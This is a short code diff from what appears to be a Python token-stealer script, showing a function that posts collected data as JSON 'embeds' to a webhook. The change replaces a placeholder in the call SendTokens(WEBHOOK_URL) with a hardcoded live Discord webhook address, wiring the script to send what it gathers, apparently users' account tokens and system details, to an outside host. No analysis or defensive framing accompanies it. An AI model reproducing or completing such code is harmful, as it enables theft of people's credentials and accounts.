@@ -284,4 +284,4 @@ Language   = {language}'''
     urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': f'{user_agent}'}))
 
 
-SendTokens(WEBHOOK_URL)
+SendTokens(https://discord.com/api/webhooks/1319464878716620930/d5wAUFvEQPGFG-2LToEFqO_NNrw-UJKCuCXqAhGmvBXlh4d2C8mK-Q9gTVNR5koLZaLs)
